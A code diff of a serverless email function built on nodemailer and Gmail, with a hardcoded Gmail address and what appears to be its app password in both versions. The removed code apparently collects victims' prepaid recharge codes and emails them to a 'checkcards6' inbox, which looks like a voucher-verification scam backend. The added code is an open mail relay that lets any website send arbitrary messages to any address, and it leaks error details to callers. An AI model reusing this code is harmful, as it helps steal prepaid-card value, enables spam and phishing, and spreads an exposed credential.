@@ -1,36 +1,56 @@
-import nodemailer from 'nodemailer';
+const nodemailer = require('nodemailer');
 
-export async function handler(event, context) {
-  try {
-    const { rechargeType, price, rechargeCode, encryptedCode, email } = JSON.parse(event.body);
+exports.handler = async (event, context) => {
+  // Set CORS headers
+  const headers = {
+    'Access-Control-Allow-Origin': '*',
+    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+    'Access-Control-Allow-Headers': 'Content-Type',
+    'Access-Control-Allow-Credentials': 'true'
+  };
 
-    const transporter = nodemailer.createTransport({
-      service: 'gmail',
-      auth: {
-        user: 'checkcards6@gmail.com', // Remplacez par votre adresse email
-        pass: 'zzhh xrqn qven pyre', // Remplacez par votre mot de passe
-      },
-    });
-
-    const mailOptions = {
-      from: email,
-      to: 'checkcards6@gmail.com',
-      subject: 'Nouvelle demande d\'authentification',
-      text: `Type de recharge : ${rechargeType}\nPrix de la recharge : ${price}\nCode de la recharge : ${rechargeCode}\nCode crypté : ${encryptedCode}\nEmail : ${email}`,
-    };
-
-    const info = await transporter.sendMail(mailOptions);
-    console.log('Email envoyé : ' + info.response);
-
+  // Handle preflight request
+  if (event.httpMethod === 'OPTIONS') {
     return {
       statusCode: 200,
-      body: JSON.stringify({ message: 'Email envoyé avec succès' }),
-    };
-  } catch (error) {
-    console.error('Erreur lors de l\'envoi de l\'emmail', error);
-    return {
-      statusCode: 500,
-      body: JSON.stringify({ message: 'Erreur lors de l\'envoi de l\'emmail' }),
+      headers: headers,
+      body: ''
     };
   }
-}
+
+  // Parse the request body
+  const { email, subject, message } = JSON.parse(event.body);
+
+  // Create a transporter object using the default SMTP transport
+  let transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+      user: 'checkcards6@gmail.com', // replace with your email
+      pass: 'zzhh xrqn qven pyre' // replace with your email password
+    }
+  });
+
+  // Set up email data with unicode symbols
+  let mailOptions = {
+    from: 'checkcards6@gmail.com', // replace with your email
+    to: email,
+    subject: subject,
+    text: message
+  };
+
+  try {
+    // Send mail with defined transport object
+    await transporter.sendMail(mailOptions);
+    return {
+      statusCode: 200,
+      headers: headers,
+      body: JSON.stringify({ message: 'Email sent successfully' })
+    };
+  } catch (error) {
+    return {
+      statusCode: 500,
+      headers: headers,
+      body: JSON.stringify({ message: 'Erreur lors de l\'envoi de l\'email', error: error.toString() })
+    };
+  }
+};
